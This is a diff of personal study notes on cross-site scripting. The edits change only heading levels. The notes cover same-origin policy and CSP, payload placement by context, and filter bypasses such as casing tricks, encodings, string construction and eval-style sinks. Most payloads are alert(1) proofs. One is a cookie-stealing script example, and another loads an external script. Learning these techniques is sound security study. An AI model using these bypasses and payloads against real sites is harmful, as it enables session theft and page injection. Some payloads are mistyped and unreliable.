@@ -14,7 +14,7 @@ Tries to set boundaries by preventing one origin (website) from accessing resour
 ## Content Security Policy (CSP) 
 Also tries to add an additional later that lets websites declare which sources of content are trusted. e.g Without CSP an attacker can injects `<script>steal(document.cookie)</script>`. However, the SOP would limit the damage - the malicious script would only be able to access data from the current origin, not from the user's other tabs. If the CSP blocking inline scripts, that injection would be blocked. 
 
-### Where is the output presenting itself?
+## Where is the output presenting itself?
 Determine where your input is getting printed in the HTTP response we receive back:
 - Inside the head or body: Easy, just use your regular HTML tags like `<script>alert(1)</script>` or load an external script `<script src=https://onofri.org/security/xss.js></script>.`
 - If you are inside a comment, you have to escape out of the comment: `--><script>alert(1)</script>`
@@ -24,7 +24,7 @@ Determine where your input is getting printed in the HTTP response we receive ba
 - If we're in JS code it depends where we are in the code, JS comments are `//`, it's line terminator is `;` and of course `'` + `"`
 - Markdown XSS is a thing: `[xss[(javascript:alert('1'))`
 
-### When is our input getting processed?
+## When is our input getting processed?
 `<script>alert(1)</script>` is triggered on page load. However if our payload loads dynamically, such as `<img src=x onerror-alert(1)>`, this may be advantageous since onerror is triggered dynamically. Which means:
 - Harder for security scanners to detect since the malicious code isn't present during initial page analysis :point_left:
 - Can bypass some client-side filters that only check content on page load :point_left:
@@ -33,7 +33,7 @@ Determine where your input is getting printed in the HTTP response we receive ba
 ## XSS Filter Bypasses
 Client-side filters are relatively easy to bypass with BurpSuite, Server-side filters like a WAF or integrated into the app vary in effectiveness as it depends largely on their config.
 
-## How might these filters be implemented?
+How might these filters be implemented?
 - Allow listing (Whitelisting) of allowed elements, attributes or characters.
 - Blacklisting of allowed elements, attributes or characters.
 - Filters are often layered. A payload may pass one filter but get caught by another
@@ -43,7 +43,7 @@ Client-side filters are relatively easy to bypass with BurpSuite, Server-side fi
 ```
 ;:!--''" <SCs>=&{[(`)]}//.
 ```
-## Weak Blacklists
+Weak Blacklists:
 - Casing: `<ScRiPt>alert(1);</ScRiPt>`
 - Casing: `<object data="JaVaScRiPt:alert(1)">`
 - Casing: `<img src=x OnErRoR=alert(1)>`
@@ -57,18 +57,18 @@ Client-side filters are relatively easy to bypass with BurpSuite, Server-side fi
 ```
 - Partial encoding e.g if the string `javascript:` is blocked, try `j&#X41vascript:`
 
-### JavaScript Encodings
+JavaScript Encodings
 - Unicode: `"\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029"`
 - Octal: `"\141\154\145\162\164\50\61\51"`
 - Hex: `"\x61\x6c\x65\x72\x74\x28\x31\x29"`
 - Base64: `atob("YWxlcnQoMSk=")`
 
-### String Creation
+String Creation
 - fromCharCode: `String.fromCharCode(97,108,101,114,116,40,49,41)`
 - source: `/alert(1)/.source`
 - URL Encoding: `decodeURI(/alert(%22xss%22)/.source)`
 
-### Execution Sinks:
+Execution Sinks:
 - eval: `eval("alert(1)")`
 - setTimeout: `setTimeout("alert(1)")`
 - setInterval: `setInterval("alert(1)")`
